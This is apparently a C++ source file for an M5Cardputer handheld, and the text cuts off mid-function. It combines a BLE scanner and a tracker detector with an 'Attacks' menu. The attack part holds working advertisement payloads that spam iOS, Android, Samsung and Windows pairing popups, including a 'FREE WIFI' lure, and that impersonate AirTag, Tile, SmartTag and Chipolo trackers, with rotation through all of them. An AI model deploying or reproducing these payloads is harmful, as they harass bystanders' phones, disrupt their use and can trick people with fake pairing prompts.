#include "app_ble.h"
#include "nav.h"
#include "input.h"
#include "config.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <NimBLEDevice.h>
#include <NimBLEScan.h>
#include <NimBLEAdvertisedDevice.h>
#include <NimBLEAdvertising.h>

static constexpr int MAX_DEVICES = 48;
static constexpr int ROWS_VIS    = 10;
static constexpr int SCAN_SECS   = 1;

// ── Scan device list ────────────────────────────────────────────────────────

struct BLEEntry { char mac[18]; char name[21]; int rssi; };
static BLEEntry s_devices[MAX_DEVICES];
static int      s_devCount = 0;

class BLEScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
    void onResult(NimBLEAdvertisedDevice* dev) override {
        if (s_devCount >= MAX_DEVICES) return;
        auto& e = s_devices[s_devCount++];
        strncpy(e.mac, dev->getAddress().toString().c_str(), 17); e.mac[17]='\0';
        strncpy(e.name, dev->haveName() ? dev->getName().c_str() : "(unknown)", 20); e.name[20]='\0';
        e.rssi = dev->getRSSI();
    }
};

// ── Tracker data ─────────────────────────────────────────────────────────────

struct TrackerHit { char label[28]; char addr[18]; char prox[8]; int rssi; uint8_t level; };
static constexpr int MAX_TRACKER_HITS = 24;
static TrackerHit s_trkHits[MAX_TRACKER_HITS];
static int        s_trkCount = 0;

static bool trkCiContains(const char* hay, const char* needle) {
    if (!hay || !needle || !*needle) return false;
    size_t nl=strlen(needle), hl=strlen(hay);
    if (nl>hl) return false;
    for (size_t i=0;i<=hl-nl;i++) {
        bool ok=true;
        for (size_t j=0;j<nl;j++) if (tolower((unsigned char)hay[i+j])!=tolower((unsigned char)needle[j])) {ok=false;break;}
        if (ok) return true;
    }
    return false;
}

static const char* trkProx(int rssi) { return rssi>=-55?"CLOSE":rssi>=-75?"NEAR":"FAR"; }

static void addTrkHit(const char* label, int rssi, uint8_t level, const char* addr) {
    for (int i=0;i<s_trkCount;i++) {
        if (strncmp(s_trkHits[i].addr,addr,17)==0) {
            if (rssi>s_trkHits[i].rssi) { s_trkHits[i].rssi=rssi; strncpy(s_trkHits[i].prox,trkProx(rssi),7); }
            return;
        }
    }
    if (s_trkCount>=MAX_TRACKER_HITS) return;
    auto& h=s_trkHits[s_trkCount++];
    strncpy(h.label,label,27); h.label[27]='\0';
    strncpy(h.addr,addr,17);   h.addr[17]='\0';
    strncpy(h.prox,trkProx(rssi),7); h.prox[7]='\0';
    h.rssi=rssi; h.level=level;
}

struct TrkNamePat { const char* match; const char* label; uint8_t level; };
static const TrkNamePat TRK_PATS[] = {
    {"airtag","AirTag",2},{"smarttag","Samsung SmartTag",2},
    {"chipolo","Chipolo Tracker",2},{"trackr","TrackR",2},
    {"nutfind","Nut Tracker",2},{"pebblebee","PebbleBee Tracker",2},
    {"tile","Tile Tracker",2},{"gt06","GPS Tracker GT06",2},
    {"gt02","GPS Tracker GT02",2},{"coban","Coban GPS Tracker",2},
    {"queclink","Queclink GPS",2},{"teltonika","Teltonika GPS",2},
    {"concox","Concox GPS",2},{"meitrack","Meitrack GPS",2},
    {"sinotrack","Sinotrack GPS",2},{"bouncie","Bouncie GPS",2},
    {"optimus","Optimus GPS",2},{"landair","LandAirSea GPS",2},
    {"tracker","Tracking Device",1},{"locator","Locator Device",1},
    {"gps","GPS Device",1},{"nut","Nut Tracker",1},
    {"findmy","Apple FindMy Dev",1},
};
static constexpr int N_TRK_PATS=(int)(sizeof(TRK_PATS)/sizeof(TRK_PATS[0]));

class TrkCallbacks : public NimBLEAdvertisedDeviceCallbacks {
    void onResult(NimBLEAdvertisedDevice* dev) override {
        int rssi=dev->getRSSI();
        char addr[18]; snprintf(addr,sizeof(addr),"%s",dev->getAddress().toString().c_str());
        const char* name=dev->haveName()?dev->getName().c_str():"";
        if (dev->haveManufacturerData()) {
            std::string mfr=dev->getManufacturerData();
            if (mfr.length()>=2) {
                uint16_t cid=(uint8_t)mfr[0]|((uint16_t)(uint8_t)mfr[1]<<8);
                if (cid==0x004C&&mfr.length()>=4&&(uint8_t)mfr[2]==0x12) {
                    addTrkHit((uint8_t)mfr[3]==0x19?"AirTag":"Apple FindMy Device",rssi,(uint8_t)mfr[3]==0x19?2:1,addr); return;
                }
                if (cid==0x0075) { addTrkHit("Samsung SmartTag",rssi,2,addr); return; }
            }
        }
        { NimBLEUUID u((uint16_t)0xFEED); if(dev->haveServiceUUID()&&dev->isAdvertisingService(u)) { addTrkHit("Tile Tracker",rssi,2,addr); return; } }
        { NimBLEUUID u((uint16_t)0xFE07); if(dev->haveServiceUUID()&&dev->isAdvertisingService(u)) { addTrkHit("Chipolo Tracker",rssi,2,addr); return; } }
        if (name&&name[0]) for (int p=0;p<N_TRK_PATS;p++) if (trkCiContains(name,TRK_PATS[p].match)) { addTrkHit(TRK_PATS[p].label,rssi,TRK_PATS[p].level,addr); return; }
    }
};
static TrkCallbacks s_trkCallbacks;

// ── Spoof / Impersonation payloads ──────────────────────────────────────────
// Manufacturer data includes company ID bytes (NimBLE setManufacturerData takes the
// full payload: company_id[2] + type[1] + len[1] + data[...])

struct SpoofTarget {
    const char* name;
    const char* desc;
    const uint8_t* mfr;     // manufacturer data (company ID included); nullptr if not used
    uint8_t mfrLen;
    uint16_t svcUuid;        // non-zero = include in service list (and in service data if svcData set)
    const uint8_t* svcData;  // service data payload excluding UUID (e.g. Fast Pair model ID)
    uint8_t svcDataLen;
};

// ── Apple Nearby Action: triggers iOS notification popups ───────────────────
// Format: [4C 00] [0F] [05] [C0] [ACTION_CODE] [00 00 00]
static const uint8_t P_TV_SETUP[]   = {0x4C,0x00, 0x0F,0x05, 0xC0,0x01,0x00,0x00,0x00};
static const uint8_t P_TV_KB[]      = {0x4C,0x00, 0x0F,0x05, 0xC0,0x0D,0x00,0x00,0x00};
static const uint8_t P_TV_SYNC[]    = {0x4C,0x00, 0x0F,0x05, 0xC0,0x0B,0x00,0x00,0x00};
static const uint8_t P_WATCH[]      = {0x4C,0x00, 0x0F,0x05, 0xC0,0x1F,0x00,0x00,0x00};
static const uint8_t P_IPHONE[]     = {0x4C,0x00, 0x0F,0x05, 0xC0,0x09,0x00,0x00,0x00};
static const uint8_t P_TRANSFER[]   = {0x4C,0x00, 0x0F,0x05, 0xC0,0x20,0x00,0x00,0x00};
// Apple AirPods proximity (type 0x07): triggers "Connect AirPods" popup
static const uint8_t P_AIRPODS2[]  = {0x4C,0x00, 0x07,0x19, 0x01,0x02,0x20,0x75,0xAA,0xB6,
                                       0x54,0x00,0x00,0x45,0x12,0x00,0x00,0x00,0x00,0x00,
                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t P_AIRPODS_PRO[]= {0x4C,0x00, 0x07,0x19, 0x01,0x02,0x20,0x75,0xAA,0xB6,
                                        0x0E,0x20,0x00,0x45,0x12,0x00,0x00,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t P_AIRPODS_MAX[]= {0x4C,0x00, 0x07,0x19, 0x01,0x02,0x20,0x75,0xAA,0xB6,
                                        0x0A,0x20,0x00,0x45,0x12,0x00,0x00,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00};
// ── Google Fast Pair: service UUID 0xFE2C + 3-byte model ID (verified) ──────
// These are the real model IDs captured from actual devices
static const uint8_t FP_PIXEL_BUDS[]    = {0x92, 0xBB, 0xBD}; // Google Pixel Buds
static const uint8_t FP_PIXEL_BUDS2[]   = {0x00, 0x00, 0x06}; // Google Pixel Buds (alt)
static const uint8_t FP_JBL_FLIP6[]     = {0x82, 0x1F, 0x66}; // JBL Flip 6
static const uint8_t FP_JBL_BUDS_PRO[]  = {0xF5, 0x24, 0x94}; // JBL Buds Pro
static const uint8_t FP_JBL_LIVE300[]   = {0x71, 0x8F, 0xA4}; // JBL Live 300TWS
static const uint8_t FP_SONY_XM5[]      = {0xD4, 0x46, 0xA7}; // Sony WH-1000XM5
static const uint8_t FP_BOSE_NC700[]    = {0xCD, 0x82, 0x56}; // Bose NC 700
static const uint8_t FP_BOSE_QC35[]     = {0x00, 0x00, 0xF0}; // Bose QuietComfort 35 II
static const uint8_t FP_RAZER[]         = {0x0E, 0x30, 0xC3}; // Razer Hammerhead TWS
static const uint8_t FP_LG[]            = {0x00, 0x03, 0xF0}; // LG HBS-835S
// ── Samsung manufacturer data payloads ───────────────────────────────────────
// Galaxy Buds 2 Pro: actual captured advertisement (triggers SmartThings popup)
static const uint8_t P_GALAXY_BUDS2P[] = {
    0x75,0x00,                                              // company ID 0x0075
    0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,
    0xAB,0x0C,0x01,0x46,0x06,0x3C,0xDD,0x0A,0x00,0x00,
    0x00,0x00,0xA7,0x00
};
// Impersonator payloads
// ── Windows Swift Pair: company ID 0x0006 + header 0x03 0x00 0x08 + ASCII ───
// Triggers "New device found" pairing popup on Windows 10/11
static const uint8_t P_WIN_WIFI[]    = {0x06,0x00, 0x03,0x00,0x08,
    'F','R','E','E',' ','W','I','F','I'};
static const uint8_t P_WIN_SPK[]     = {0x06,0x00, 0x03,0x00,0x08,
    'B','T',' ','S','p','e','a','k','e','r'};
static const uint8_t P_WIN_XBOX[]    = {0x06,0x00, 0x03,0x00,0x08,
    'X','b','o','x',' ','C','o','n','t','r','o','l','l','e','r'};
static const uint8_t P_WIN_HEADSET[] = {0x06,0x00, 0x03,0x00,0x08,
    'H','e','a','d','s','e','t'};
static const uint8_t P_WIN_MOUSE[]   = {0x06,0x00, 0x03,0x00,0x08,
    'M','i','c','r','o','s','o','f','t',' ','M','o','u','s','e'};
// Impersonator payloads
static const uint8_t P_AIRTAG[]    = {0x4C,0x00, 0x12,0x13,
                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t P_SAMSUNG[]   = {0x75,0x00, 0x42,0x09,0x01,0x00,0x00,0x00};

// name, desc, mfr, mfrLen, svcUuid, svcData, svcDataLen
static const SpoofTarget SPOOFER_TARGETS[] = {
    // Apple (manufacturer data → iOS popups)
    {"AirPods 2",     "Connect popup on iOS",    P_AIRPODS2,      sizeof(P_AIRPODS2),      0,      nullptr,          0},
    {"AirPods Pro",   "Pro connect popup",        P_AIRPODS_PRO,   sizeof(P_AIRPODS_PRO),   0,      nullptr,          0},
    {"AirPods Max",   "Max connect popup",        P_AIRPODS_MAX,   sizeof(P_AIRPODS_MAX),   0,      nullptr,          0},
    {"Apple TV",      "TV setup popup on iOS",    P_TV_SETUP,      sizeof(P_TV_SETUP),      0,      nullptr,          0},
    {"AppleTV Sync",  "Audio sync popup",         P_TV_SYNC,       sizeof(P_TV_SYNC),       0,      nullptr,          0},
    {"AppleTV KB",    "Keyboard popup",           P_TV_KB,         sizeof(P_TV_KB),         0,      nullptr,          0},
    {"Apple Watch",   "Watch pairing popup",      P_WATCH,         sizeof(P_WATCH),         0,      nullptr,          0},
    {"iPhone Setup",  "New iPhone popup",         P_IPHONE,        sizeof(P_IPHONE),        0,      nullptr,          0},
    {"iPhone Xfer",   "Phone number share popup", P_TRANSFER,      sizeof(P_TRANSFER),      0,      nullptr,          0},
    // Samsung (manufacturer data → SmartThings popup)
    {"Galaxy Buds2P", "Samsung SmartThings popup",P_GALAXY_BUDS2P, sizeof(P_GALAXY_BUDS2P), 0,      nullptr,          0},
    // Google Fast Pair (UUID 0xFE2C service data → Android Fast Pair popup)
    {"Pixel Buds",    "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_PIXEL_BUDS,    sizeof(FP_PIXEL_BUDS)},
    {"Pixel Buds alt","Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_PIXEL_BUDS2,   sizeof(FP_PIXEL_BUDS2)},
    {"JBL Flip 6",    "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_JBL_FLIP6,     sizeof(FP_JBL_FLIP6)},
    {"JBL Buds Pro",  "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_JBL_BUDS_PRO,  sizeof(FP_JBL_BUDS_PRO)},
    {"JBL Live 300",  "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_JBL_LIVE300,   sizeof(FP_JBL_LIVE300)},
    {"Sony XM5",      "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_SONY_XM5,      sizeof(FP_SONY_XM5)},
    {"Bose NC 700",   "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_BOSE_NC700,    sizeof(FP_BOSE_NC700)},
    {"Bose QC35 II",  "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_BOSE_QC35,     sizeof(FP_BOSE_QC35)},
    {"Razer Hammer",  "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_RAZER,         sizeof(FP_RAZER)},
    {"LG HBS-835S",   "Fast Pair - Android popup",nullptr,         0,                       0xFE2C, FP_LG,            sizeof(FP_LG)},
    // Windows Swift Pair (company 0x0006 → Windows 10/11 pairing popup)
    {"Win FREE WIFI",  "Win10/11 Swift Pair popup", P_WIN_WIFI,    sizeof(P_WIN_WIFI),    0, nullptr, 0},
    {"Win BT Speaker", "Win10/11 Swift Pair popup", P_WIN_SPK,     sizeof(P_WIN_SPK),     0, nullptr, 0},
    {"Win Xbox Ctrl",  "Win10/11 Swift Pair popup", P_WIN_XBOX,    sizeof(P_WIN_XBOX),    0, nullptr, 0},
    {"Win Headset",    "Win10/11 Swift Pair popup", P_WIN_HEADSET, sizeof(P_WIN_HEADSET), 0, nullptr, 0},
    {"Win MS Mouse",   "Win10/11 Swift Pair popup", P_WIN_MOUSE,   sizeof(P_WIN_MOUSE),   0, nullptr, 0},
    {"[Cycle All]",   "Rotate all 3s each",         nullptr,       0,                     0, nullptr, 0},
};
static constexpr int N_SPOOFER = (int)(sizeof(SPOOFER_TARGETS)/sizeof(SPOOFER_TARGETS[0]));

// Cycle: Apple (0-8), Samsung (9), Google FP (10-19), Windows (20-24)
static const int CYCLE_ORDER[] = {0,3,4,5,6,7,8,1,2,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24};
static constexpr int N_CYCLE = (int)(sizeof(CYCLE_ORDER)/sizeof(CYCLE_ORDER[0]));

static const SpoofTarget IMPERSONATE_TARGETS[] = {
    {"AirTag",         "Apple AirTag (FindMy)", P_AIRTAG,  sizeof(P_AIRTAG),  0,      nullptr, 0},
    {"Tile Tracker",   "Tile BLE beacon",       nullptr,   0,                 0xFEED, nullptr, 0},
    {"Samsung Tag",    "SmartTag BLE beacon",   P_SAMSUNG, sizeof(P_SAMSUNG), 0,      nullptr, 0},
    {"Chipolo",        "Chipolo tracker",       nullptr,   0,                 0xFE07, nullptr, 0},
    {"[Cycle All]",    "Rotate all 4s each",    nullptr,   0,                 0,      nullptr, 0},
};
static constexpr int N_IMPERSONATE = (int)(sizeof(IMPERSONATE_TARGETS)/sizeof(IMPERSONATE_TARGETS[0]));

static const int IMP_CYCLE[] = {0,1,2,3};
static constexpr int N_IMP_CYCLE = (int)(sizeof(IMP_CYCLE)/sizeof(IMP_CYCLE[0]));

namespace {

enum class BleState {
    MENU,
    TRACKER_SCAN, LIST, TRACKER_DONE,
    ATTACKS_MENU,
    SPOOF_LIST, IMPERSONATE_LIST,
    BROADCASTING
};
enum class ScanMode  { DEVICES, TRACKERS };
enum class AttackSub { SPOOF, IMPERSONATE };

bool            s_bleInited = false;
BleState        s_state     = BleState::MENU;
bool            s_dirty     = true;
int             s_scroll    = 0;
int             s_menuSel   = 0;
NimBLEScan*     s_scan      = nullptr;
BLEScanCallbacks s_callbacks;
volatile bool   s_scanDone  = false;
ScanMode        s_scanMode  = ScanMode::DEVICES;

// Attack state
AttackSub       s_attackSub = AttackSub::SPOOF;
int             s_spoofSel  = 0;
int             s_impSel    = 0;
bool            s_broadcasting = false;
bool            s_cycleMode = false;
int             s_cycleIdx  = 0;
unsigned long   s_cycleMs   = 0;
AttackSub       s_bcastSub  = AttackSub::SPOOF;
int             s_bcastIdx  = 0;  // current target idx in cycle or selected idx

void shutdownBle() {
    if (s_scan && s_scan->isScanning()) s_scan->stop();
    if (s_broadcasting) {
        NimBLEDevice::getAdvertising()->stop();
        s_broadcasting = false;
    }
    if (s_bleInited) {
        NimBLEDevice::deinit(true);
        s_scan = nullptr;
        s_bleInited = false;
    }
}

void onScanComplete(NimBLEScanResults) { s_scanDone = true; }

void ensureBleInit() {
    if (s_bleInited) return;
    if (WiFi.getMode() != WIFI_OFF) {
        WiFi.disconnect(true, true); delay(80);
        WiFi.mode(WIFI_OFF); delay(180);
    }
    NimBLEDevice::init("");
    s_scan = NimBLEDevice::getScan();
    s_scan->setAdvertisedDeviceCallbacks(&s_callbacks);
    s_scan->setActiveScan(true);
    s_scan->setInterval(100);
    s_scan->setWindow(99);
    s_bleInited = true;
}

// Starts advertising for a given target (may be spoofer or impersonator table)
void startBroadcast(const SpoofTarget* tgt) {
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    adv->stop();
    NimBLEAdvertisementData data;
    data.setFlags(0x06);  // LE General Discoverable, BR/EDR not supported
    if (tgt->mfr && tgt->mfrLen > 0) {
        data.setManufacturerData(std::string((const char*)tgt->mfr, tgt->mfrLen));
    } else if (tgt->svcData && tgt->svcDataLen > 0 && tgt->svcUuid != 0) {
        // Fast Pair: UUID in service list + service data + TX Power Level (Android requires all 3)
        std::vector<NimBLEUUID> uuids = {NimBLEUUID(tgt->svcUuid)};
        data.setCompleteServices16(uuids);
        data.setServiceData(NimBLEUUID(tgt->svcUuid),
                            std::string((const char*)tgt->svcData, tgt->svcDataLen));
        data.addData(std::string({(char)0x02, (char)0x0A, (char)0x00})); // TX Power Level = 0 dBm
    } else if (tgt->svcUuid != 0) {
        std::vector<NimBLEUUID> uuids = {NimBLEUUID(tgt->svcUuid)};
        data.setCompleteServices16(uuids);
    }
    adv->setAdvertisementData(data);
    adv->setScanResponse(false);
    adv->start(0);
    s_broadcasting = true;
}

void stopBroadcast() {
    if (s_broadcasting) {
        NimBLEDevice::getAdvertising()->stop();
        s_broadcasting = false;
    }
    s_cycleMode = false;
}

// ── Draw helpers ─────────────────────────────────────────────────────────────

void drawStatusBar(const char* title) {
    auto& d = M5Cardputer.Display;
    d.fillRect(0,0,SCREEN_W,STATUS_H,C_STATUS_BG);
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(C_STATUS_FG,C_STATUS_BG);
    d.setCursor(2,3); d.print(title);
    drawBatteryWidget(C_STATUS_BG, SCREEN_W-43);
}

void drawMenu() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("BLE Tools");
    d.setFont(&fonts::Font0); d.setTextSize(1);
    static const struct { const char* title; const char* sub; uint32_t col; } CARDS[] = {
        {"BLE Scanner",  "Scan & list nearby BLE devices",  0x0055CC},
        {"Tracker Scan", "Detect AirTag, Tile, GPS...",     0xCC0044},
        {"Attacks",      "Spoof & impersonate devices",     0xAA5500},
    };
    for (int i = 0; i < 3; i++) {
        int y = 15 + i * 28;
        bool sel = (i == s_menuSel);
        uint32_t col = CARDS[i].col;
        if (sel) { d.fillRoundRect(2,y,SCREEN_W-4,26,4,col); d.setTextColor(0x000000,col); }
        else      { d.drawRoundRect(2,y,SCREEN_W-4,26,4,col); d.setTextColor(col,C_BG); }
        d.setCursor(10,y+5); d.print(CARDS[i].title);
        d.setTextColor(sel?(uint32_t)0x333333:(uint32_t)C_DIM, sel?col:(uint32_t)C_BG);
        d.setCursor(10,y+15); d.print(CARDS[i].sub);
    }
    d.setTextColor(C_DIM,C_BG); d.setCursor(2,SCREEN_H-10);
    d.print("up/dn=select  Enter=open  bksp=home");
}

void drawAttacksMenu() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("BLE Attacks");
    d.setFont(&fonts::Font0); d.setTextSize(1);
    static const struct { const char* title; const char* sub; uint32_t col; } CARDS[] = {
        {"Spoofer",      "Apple/Google popup spam",          0xCC6600},
        {"Impersonator", "Clone AirTag, Tile, SmartTag",     0x770077},
    };
    for (int i = 0; i < 2; i++) {
        int y = 15 + i * 28;
        bool sel = (i == s_menuSel);
        uint32_t col = CARDS[i].col;
        if (sel) { d.fillRoundRect(2,y,SCREEN_W-4,26,4,col); d.setTextColor(0x000000,col); }
        else      { d.drawRoundRect(2,y,SCREEN_W-4,26,4,col); d.setTextColor(col,C_BG); }
        d.setCursor(10,y+5); d.print(CARDS[i].title);
        d.setTextColor(sel?(uint32_t)0x333333:(uint32_t)C_DIM, sel?col:(uint32_t)C_BG);
        d.setCursor(10,y+15); d.print(CARDS[i].sub);
    }
    d.setTextColor(C_DIM,C_BG); d.setCursor(2,SCREEN_H-10);
    d.print("up/dn=select  Enter  bksp=back");
}

void drawTargetList(const SpoofTarget* tgts, int count, int sel, const char* title) {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar(title);
    d.setFont(&fonts::Font0); d.setTextSize(1);
    constexpr int VIS = (SCREEN_H - STATUS_H - FONT_H - 4) / (FONT_H + 2);
    int off = (sel >= VIS) ? sel - VIS + 1 : 0;
    for (int i=0;i<VIS;i++) {
        int idx=i+off;
        if (idx>=count) break;
        bool s=(idx==sel);
        int y=STATUS_H+i*(FONT_H+2);
        d.fillRect(0,y,SCREEN_W,FONT_H+2,s?C_HIGHLIGHT:C_BG);
        d.setTextColor(s?(uint32_t)C_INPUT:(uint32_t)C_FG, s?C_HIGHLIGHT:C_BG);
        d.setCursor(4,y+1);
        char line[38]; snprintf(line,sizeof(line),"%-16s %s",tgts[idx].name,tgts[idx].desc);
        d.print(line);
    }
    d.setTextColor(C_DIM,C_BG); d.setCursor(2,SCREEN_H-FONT_H-2);
    d.print("Enter=start  bksp=back");
}

void drawBroadcasting(const char* targetName) {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Broadcasting");
    d.setFont(&fonts::Font0);
    d.setTextSize(2);
    d.setTextColor(0xFF6600,C_BG);
    const char* tx = "TX ACTIVE";
    d.setCursor((SCREEN_W-(int)strlen(tx)*FONT_W*2)/2, 28);
    d.print(tx);
    d.setTextSize(1);
    d.setTextColor(C_FG,C_BG);
    char ln[32]; snprintf(ln,sizeof(ln),">>> %s",targetName);
    d.setCursor((SCREEN_W-(int)strlen(ln)*FONT_W)/2, 60);
    d.print(ln);
    d.setTextColor(C_DIM,C_BG);
    d.setCursor(2,SCREEN_H-FONT_H-2);
    d.print("bksp=stop broadcasting");
}

void drawScanning(bool tracker) {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar(tracker?"Tracker Scan":"BLE Scanner");
    d.setFont(&fonts::Font0); d.setTextSize(2);
    d.setTextColor(tracker?(uint32_t)0xFF6688:(uint32_t)C_FG,C_BG);
    const char* msg="Scanning...";
    d.setCursor((SCREEN_W-(int)strlen(msg)*FONT_W*2)/2,36); d.print(msg);
    d.setTextSize(1); d.setTextColor(C_DIM,C_BG);
    const char* sub=tracker?"BLE 8 sec -- stay still":"Please wait...";
    d.setCursor((SCREEN_W-(int)strlen(sub)*FONT_W)/2,64); d.print(sub);
}

void drawList() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("BLE Scanner");
    d.setFont(&fonts::Font0); d.setTextSize(1);
    if (s_devCount==0) {
        d.setTextColor(C_DIM,C_BG); d.setCursor(14,54); d.print("No devices found");
    } else {
        for (int i=0;i<ROWS_VIS&&(s_scroll+i)<s_devCount;i++) {
            const auto& dev=s_devices[s_scroll+i];
            int y=STATUS_H+2+i*11;
            uint32_t rc=dev.rssi>=-70?(uint32_t)0x00CC00:dev.rssi>=-80?(uint32_t)0xCCAA00:(uint32_t)0xFF5555;
            d.setTextColor(rc,C_BG);
            char rb[5]; snprintf(rb,sizeof(rb),"%4d",dev.rssi);
            d.setCursor(0,y); d.print(rb);
            d.setTextColor(0x888888,C_BG); d.setCursor(26,y); d.print(dev.mac+9);
            d.setTextColor(C_FG,C_BG); d.setCursor(82,y);
            char nm[21]; strncpy(nm,dev.name,20); nm[20]='\0'; d.print(nm);
        }
    }
    d.fillRect(0,SCREEN_H-FONT_H-2,SCREEN_W,FONT_H+2,C_BG);
    d.setTextColor(C_DIM,C_BG);
    char footer[48]; snprintf(footer,sizeof(footer),"%d found  up/dn  Enter=rescan",s_devCount);
    d.setCursor(2,SCREEN_H-FONT_H-1); d.print(footer);
}

void drawTrackerResults() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Tracker Scan");
    d.setFont(&fonts::Font0); d.setTextSize(1);
    if (s_trkCount==0) {
        d.setTextColor(0x00CC44,C_BG); d.setTextSize(2);
        const char* ok="No Trackers";
        d.setCursor((SCREEN_W-(int)strlen(ok)*FONT_W*2)/2,16); d.print(ok);
        d.setTextSize(1); d.setTextColor(C_DIM,C_BG);
        d.setCursor(4,44); d.print("No known tracking devices found.");
        d.setCursor(4,56); d.print("AirTags randomize MAC ~15 min.");
        d.setCursor(4,66); d.print("Run multiple scans if concerned.");
        d.setCursor(4,80); d.print("GPS trackers (cellular-only)");
        d.setCursor(4,90); d.print("cannot be detected via BLE.");
        d.setCursor(4,108); d.print("Enter=rescan  bksp=menu");
    } else {
        for (int i=0;i<s_trkCount-1;i++)
            for (int j=0;j<s_trkCount-1-i;j++)
                if (s_trkHits[j].rssi<s_trkHits[j+1].rssi) { TrackerHit t=s_trkHits[j]; s_trkHits[j]=s_trkHits[j+1]; s_trkHits[j+1]=t; }
        bool anyClose=false;
        for (int i=0;i<s_trkCount;i++) if (s_trkHits[i].prox[0]=='C') {anyClose=true;break;}
        uint32_t hcol=anyClose?(uint32_t)0xFF3333:(uint32_t)0xFFAA00;
        d.setTextColor(hcol,C_BG); d.setTextSize(2);
        char hdr[20]; snprintf(hdr,sizeof(hdr),"%d FOUND!",s_trkCount);
        d.setCursor((SCREEN_W-(int)strlen(hdr)*FONT_W*2)/2,16); d.print(hdr);
        d.setTextSize(1);
        constexpr int ROW_H=14,ROWS=(SCREEN_H-STATUS_H-32)/ROW_H;
        for (int i=0;i<ROWS&&(s_scroll+i)<s_trkCount;i++) {
            const auto& h=s_trkHits[s_scroll+i]; int y=STATUS_H+26+i*ROW_H;
            uint32_t col=h.prox[0]=='C'?(uint32_t)0xFF3333:h.prox[0]=='N'?(uint32_t)0xFFAA00:(uint32_t)0xAAAAAA;
            d.fillRect(0,y,3,ROW_H-1,col);
            d.setTextColor(col,C_BG); d.setCursor(6,y+3); d.print(h.prox);
            d.setTextColor(h.level>=2?(uint32_t)0xFFFFFF:(uint32_t)0xAAAAAA,C_BG);
            char buf[28]; snprintf(buf,sizeof(buf),"%-20s",h.label); d.setCursor(42,y+3); d.print(buf);
            d.setTextColor(0x777777,C_BG); char dbm[8]; snprintf(dbm,sizeof(dbm),"%4d",h.rssi);
            d.setCursor(SCREEN_W-26,y+3); d.print(dbm);
        }
        d.setTextColor(C_DIM,C_BG);
        char foot[48]; snprintf(foot,sizeof(foot),"%d device%s  up/dn  Enter=rescan",s_trkCount,s_trkCount==1?"":"s");
        d.setCursor(2,SCREEN_H-10); d.print(foot);
    }
}

void doScan(int secs) {
    s_scanDone = false;
    s_scan->clearResults();
    s_scan->start(secs, onScanComplete, false);
}

// Advance cycle to next index, restarts advertising
void advanceCycle() {
    const SpoofTarget* tgts;
    const int* order;
    int n;
    if (s_bcastSub == AttackSub::SPOOF) {
        tgts = SPOOFER_TARGETS; order = CYCLE_ORDER; n = N_CYCLE;
    } else {
        tgts = IMPERSONATE_TARGETS; order = IMP_CYCLE; n = N_IMP_CYCLE;
    }
    s_cycleIdx = (s_cycleIdx + 1) % n;
    s_bcastIdx = order[s_cycleIdx];
    startBroadcast(&tgts[s_bcastIdx]);
}

} // namespace

// ── Public ────────────────────────────────────────────────────────────────────

void appBleEnter() {
    s_state   = BleState::MENU;
    s_dirty   = true;
    s_menuSel = 0;
    s_scroll  = 0;
    s_devCount = 0;
    s_trkCount = 0;
    ensureBleInit();
}

void appBleLoop() {
    // Advance cycle timer while broadcasting
    if (s_broadcasting && s_cycleMode && millis()-s_cycleMs > 3000) {
        s_cycleMs = millis();
        advanceCycle();
        // Redraw broadcasting screen with updated name
        const SpoofTarget* tgts = (s_bcastSub==AttackSub::SPOOF) ? SPOOFER_TARGETS : IMPERSONATE_TARGETS;
        drawBroadcasting(tgts[s_bcastIdx].name);
    }

    // Scan completion
    if (s_scanDone) {
        s_scanDone = false;
        s_state = (s_scanMode==ScanMode::TRACKERS) ? BleState::TRACKER_DONE : BleState::LIST;
        s_dirty = true;
    }

    if (s_dirty) {
        switch (s_state) {
            case BleState::MENU:         drawMenu();    break;
            case BleState::ATTACKS_MENU: drawAttacksMenu(); break;
            case BleState::LIST:         drawList();    break;
            case BleState::TRACKER_DONE: drawTrackerResults(); break;
            case BleState::SPOOF_LIST:
                drawTargetList(SPOOFER_TARGETS, N_SPOOFER, s_spoofSel, "Spoofer"); break;
            case BleState::IMPERSONATE_LIST:
                drawTargetList(IMPERSONATE_TARGETS, N_IMPERSONATE, s_impSel, "Impersonator"); break;
            case BleState::BROADCASTING: {
                const SpoofTarget* tgts = (s_bcastSub==AttackSub::SPOOF) ? SPOOFER_TARGETS : IMPERSONATE_TARGETS;
                drawBroadcasting(tgts[s_bcastIdx].name); break;
            }
            default: break;
        }
        s_dirty = false;
    }

    auto ev = readKeys();
    if (!ev.changed) return;

    // Back always goes up one level
    if (ev.back) {
        if (s_state == BleState::BROADCASTING) {
            stopBroadcast();
            s_state = (s_bcastSub==AttackSub::SPOOF) ? BleState::SPOOF_LIST : BleState::IMPERSONATE_LIST;
            s_dirty = true; return;
        }
